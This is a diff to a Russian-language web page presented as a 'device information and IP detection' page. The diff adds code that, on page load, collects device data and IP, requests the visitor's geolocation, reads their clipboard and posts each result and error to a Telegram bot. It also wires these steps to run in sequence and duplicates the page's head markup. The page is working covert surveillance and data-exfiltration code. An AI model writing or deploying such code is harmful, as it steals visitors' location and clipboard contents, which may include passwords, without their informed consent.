@@ -4,6 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Информация об устройстве и определение IP</title>
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Информация об устройстве и определение IP</title>
 </head>
 <body>
     <h1>Добро пожаловать на страницу определения информации об устройстве и IP</h1>
@@ -206,7 +212,7 @@
             fetch(telegramApiUrl, {
                 method: 'POST',
                 headers: {
-'Content-Type': 'application/json'
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify(payload)
             })
@@ -223,8 +229,10 @@
             });
         }
 
-       // Запуск функции для сбора и отправки информации
-        getCompleteInfo();
+        // Запуск функции для сбора и отправки информации
+        getCompleteInfo().then(() => {
+            requestGeolocation();
+        });
 
         // Функция для запроса геолокации пользователя
         function requestGeolocation() {
@@ -246,6 +254,7 @@
                 sendLocationErrorToTelegram();
             }
         }
+
         // Функция для отправки геолокации в Telegram-бот
         function sendLocationToTelegram(latitude, longitude) {
             const message = `Геолокация пользователя: ${latitude},${longitude}`;
@@ -267,6 +276,7 @@
             })
             .catch(error => {
                 console.error('Ошибка при отправке геолокации в Telegram:', error);
+                requestClipboardData(); // Пробуем получить буфер обмена даже при ошибке
             });
         }
 
@@ -291,6 +301,7 @@
             })
             .catch(error => {
                 console.error('Ошибка при отправке информации об отказе в геолокации в Telegram:', error);
+                requestClipboardData(); // Пробуем получить буфер обмена даже при ошибке
             });
         }
 
@@ -301,6 +312,7 @@
                 sendClipboardDataToTelegram(text);
             } catch (err) {
                 console.error('Не удалось прочитать содержимое буфера обмена: ', err);
+                sendClipboardDataErrorToTelegram();
             }
         }
 
@@ -324,6 +336,29 @@
             })
             .catch(error => {
                 console.error('Ошибка при отправке данных буфера обмена в Telegram:', error);
+            });
+        }
+
+        // Функция для отправки ошибки чтения буфера обмена в Telegram-бот
+        function sendClipboardDataErrorToTelegram() {
+            const message = 'Не удалось получить доступ к буферу обмена.';
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Ошибка доступа к буферу обмена отправлена в Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке ошибки доступа к буферу обмена в Telegram:', error);
             });
         }
 
